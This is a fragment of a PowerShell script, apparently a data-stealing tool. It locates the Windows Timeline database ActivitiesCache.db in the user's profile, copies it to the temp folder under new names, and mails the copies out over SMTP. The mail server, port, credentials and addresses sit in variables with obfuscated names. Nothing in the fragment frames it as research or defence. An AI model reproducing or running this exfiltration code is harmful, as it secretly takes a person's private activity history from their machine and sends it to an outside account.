...
#============================================================== GRAB ACTIVITIES CACHE ======================================================================


Write-Output "Extracting Cache..."

Get-ChildItem -Path "$env:USERPROFILE\appdata\Local\ConnectedDevicesPlatform" -Recurse -Filter "ActivitiesCache.db" -ErrorAction SilentlyContinue | Select-Object -First 1 | Copy-Item -Destination "$env:temp" 

Rename-Item -Path "$env:temp\ActivitiesCache.db" -NewName "$env:temp\cache1.db"

Get-ChildItem -Path "$env:USERPROFILE\appdata\Local\ConnectedDevicesPlatform" -Recurse -Filter "ActivitiesCache.db" -ErrorAction SilentlyContinue | Select-Object -First 2 | Copy-Item -Destination "$env:temp"

Rename-Item -Path "$env:temp\ActivitiesCache.db" -NewName "$env:temp\cache2.db"

$Cache1 = "$env:temp\cache1.db"
$Cache2 = "$env:temp\cache2.db"
$vrdiugb2 = "$env:COMPUTERNAME : : Activities Cache"
$bfsvvrnbn2 = "$env:COMPUTERNAME : Activities Cache Files... : $tfhftttt"


Sleep 1

Write-Output "Sending Cache Files..."

send-mailmessage -from $htffthft -to $htffthft -subject $vrdiugb2 -body $bfsvvrnbn2 -Attachment $Cache1,$Cache2 -smtpServer $rtthtegtd -port $rgdgthyu -credential $gtthyuyju -usessl
Write-Output "Sent."
